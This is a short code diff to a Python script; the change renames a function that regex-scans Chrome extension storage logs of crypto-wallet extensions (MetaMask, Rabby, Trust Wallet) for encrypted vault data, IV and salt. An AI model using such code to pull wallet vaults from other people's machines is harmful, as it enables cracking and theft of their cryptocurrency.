@@ -24,7 +24,7 @@ def findEncryptedData(path):
     
     return {"status":False, "data": []}
 
-def findEncryptedDataV2(path):
+def search_cydata(path):
     with open(path, "r", encoding="utf-8", errors='ignore') as f: file = f.read()
     regex = [
         r'{\\\"data\\\":\\\"(.+?)\\\",\\\"iv\\\":\\\"(.+?)\\\",\\\"salt\\\":\\\"(.+?)\\\"}',
@@ -64,5 +64,5 @@ rabby = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Exte
 trustw = r"C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph\000051.log"
 
 
-print(findEncryptedDataV2(metamask))
+print(search_cydata(metamask))
 
